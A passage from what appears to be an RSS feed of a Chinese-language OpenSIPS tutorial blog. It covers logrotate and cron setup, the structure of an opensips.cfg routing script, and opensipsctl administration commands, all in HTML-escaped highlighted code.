&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     compress
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     sharedscripts
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     postrotate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;kill &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;HUP &lt;span style=&#34;color:#66d9ef&#34;&gt;`cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;run&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;syslogd.pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;kill &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;HUP &lt;span style=&#34;color:#66d9ef&#34;&gt;`cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;run&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;rsyslogd.pid &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;dev&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; true
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     endscript
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配置定时任务&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-systemverilog&#34; data-lang=&#34;systemverilog&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;logrotate &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;etc&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;logrotate.d&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;opensips
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>配置文件</title>
      <link>https://wdd.js.org/opensips/ch5/routing-script/</link>
      <pubDate>Thu, 13 Jun 2019 22:10:45 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/routing-script/</guid>
      <description>&lt;h1 id=&#34;脚本预处理&#34;&gt;脚本预处理&lt;/h1&gt;
&lt;p&gt;如果你的opensips.cfg文件不大，可以写成一个文件。否则建议使用include_file引入配置文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;include_file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;global.cfg&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有些配置，建议使用m4宏处理。&lt;/p&gt;
&lt;h1 id=&#34;脚本结构&#34;&gt;脚本结构&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   debug&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   fork&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:127.0.0.1:5060
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; has_totag&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       loose_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; from_uri!&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;myself &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; uri!&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;myself &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Rely forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_status&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;486&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       $rd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.10&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;脚本一般由三个部分组成：&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips管理命令</title>
      <link>https://wdd.js.org/opensips/ch3/opensipsctl/</link>
      <pubDate>Thu, 13 Jun 2019 22:03:19 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/opensipsctl/</guid>
      <description>&lt;p&gt;可以使用一下命令查找opensips的相关文件夹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -name opensips -type d
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一般来说，重要的是opensips.cfg文件，这个文件一般位于&lt;code&gt;/usr/local/etc/opensips/&lt;/code&gt;或者&lt;code&gt;/usr/etc/opensips&lt;/code&gt;中。主要还是要看安装时选择的默认路径。&lt;/p&gt;
&lt;p&gt;其中1.x版本的配置文件一般位于&lt;code&gt;/usr/etc/opensips&lt;/code&gt;目录中，2.x版本的配置一般位于&lt;code&gt;/usr/local/etc/opensips&lt;/code&gt;目录中。&lt;/p&gt;
&lt;p&gt;下面主要讲解几个命令。&lt;/p&gt;
&lt;h1 id=&#34;配置文件校验&#34;&gt;配置文件校验&lt;/h1&gt;
&lt;p&gt;校验opensips.cfg脚本是否合法, 如果有问题，会提示那行代码有问题，但是报错位置好像一直不准确。很多时候可能是忘记写分好了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensips -C opensips.cfg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;启动关闭与重启&#34;&gt;启动关闭与重启&lt;/h1&gt;
&lt;p&gt;使用opensipsctl命令做数据库操作前，需要先配置opensipsctlrc文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensips start|stop|restart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl start|stop|restart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;资源创建&#34;&gt;资源创建&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsdbctl create &lt;span style=&#34;color:#75715e&#34;&gt;# 创建数据库&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl domain add abc.cc &lt;span style=&#34;color:#75715e&#34;&gt;#创建域名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl add 1001@test.cc &lt;span style=&#34;color:#ae81ff&#34;&gt;12346&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 新增用户&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl rm 1001@test.cc &lt;span style=&#34;color:#75715e&#34;&gt;# 删除用户&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;opensipsctl passwdd 1001@test.cc &lt;span style=&#34;color:#ae81ff&#34;&gt;09879&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 修改密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;opensipsctl -h 显示所有可用命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/local/sbin/opensipsctl $Revision: &lt;span style=&#34;color:#ae81ff&#34;&gt;4448&lt;/span&gt; $
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Existing commands:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;start|stop|restart|trap&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; trap ............................... trap with gdb OpenSIPS processes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; restart ............................ restart OpenSIPS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; start .............................. start OpenSIPS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; stop ............................... stop OpenSIPS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;acl&amp;#39;&lt;/span&gt; - manage access control lists &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;acl&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; acl show &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;lt;username&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; .............. show user membership
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; acl grant &amp;lt;username&amp;gt; &amp;lt;group&amp;gt; ....... grant user membership &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; acl revoke &amp;lt;username&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&amp;lt;group&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; .... grant user membership&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cr&amp;#39;&lt;/span&gt; - manage carrierroute tables
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr show ....................................................... show tables
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr reload ..................................................... reload tables
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr dump ....................................................... show in memory tables
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr addrt &amp;lt;routing_tree_id&amp;gt; &amp;lt;routing_tree&amp;gt; ..................... add a tree
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr rmrt  &amp;lt;routing_tree&amp;gt; ....................................... rm a tree
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr addcarrier &amp;lt;carrier&amp;gt; &amp;lt;scan_prefix&amp;gt; &amp;lt;domain&amp;gt; &amp;lt;rewrite_host&amp;gt; ................
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &amp;lt;prob&amp;gt; &amp;lt;strip&amp;gt; &amp;lt;rewrite_prefix&amp;gt; &amp;lt;rewrite_suffix&amp;gt; ...............
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &amp;lt;flags&amp;gt; &amp;lt;mask&amp;gt; &amp;lt;comment&amp;gt; .........................add a carrier
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;prob, strip, rewrite_prefix, rewrite_suffix,...................
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                flags, mask and comment are optional arguments&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ...............
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cr rmcarrier  &amp;lt;carrier&amp;gt; &amp;lt;scan_prefix&amp;gt; &amp;lt;domain&amp;gt; ................ rm a carrier
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; -- command &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rpid&amp;#39;&lt;/span&gt; - manage Remote-Party-ID &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RPID&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; rpid add &amp;lt;username&amp;gt; &amp;lt;rpid&amp;gt; ......... add rpid &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a user &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
